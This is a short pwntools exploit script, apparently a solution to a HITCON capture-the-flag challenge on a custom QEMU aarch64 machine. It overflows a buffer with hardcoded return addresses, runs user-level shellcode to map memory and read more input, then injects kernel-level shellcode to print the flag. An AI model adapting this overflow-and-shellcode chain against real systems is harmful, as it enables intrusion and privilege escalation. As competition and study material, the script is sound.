from pwn import *
context(arch='aarch64',endian='little')
  
cmd  = "cd ../../../../run ;"
cmd += "./qemu-system-aarch64 -nographic -machine hitcon -cpu hitcon "
cmd += "-bios ./bios.bin -monitor /dev/null 2>/dev/null -serial null "
cmd += "-S -s"

io = process(["/bin/sh","-c",cmd])

mprotect = 0x401B68
gets     = 0x4019B0
sc_addr  = 0x7ffeffffd008

el0_shellcode = asm('''
    // a = mmap(0,0x1000,0x3)
    mov x0, 0x0 
    mov x1, 0x1000
    mov x2, 0x3
    mov x8, 0xde
    svc 0
    
    // gets(a)
    ldr x3, =0x4019B0
    blr x3
    
    nop
''')

el1_shellcode = asm('''
    // print flag
    ldr x3, =0xffffffffc000840c
    blr x3
''')

assert( b"\x0a" not in el0_shellcode)
assert( b"\x0b" not in el0_shellcode)

assert( b"\x0a" not in el1_shellcode)
assert( b"\x0b" not in el1_shellcode)

io.sendlineafter(b"cmd> ",b"0")
io.sendlineafter(b"index: ",b'a'*0xf8+p64(sc_addr)+p64(gets)+p64(mprotect))
io.sendline(b'a'*8+el0_shellcode)

io.sendlineafter(b"cmd> ",b"1")
io.sendlineafter(b"index: ",b'4096')
io.sendlineafter(b"key: ",b'12345')

io.sendlineafter(b"cmd> ",b"-1")
io.sendlineafter(b"index: ",b'1')

io.sendline(el1_shellcode)
io.interactive()

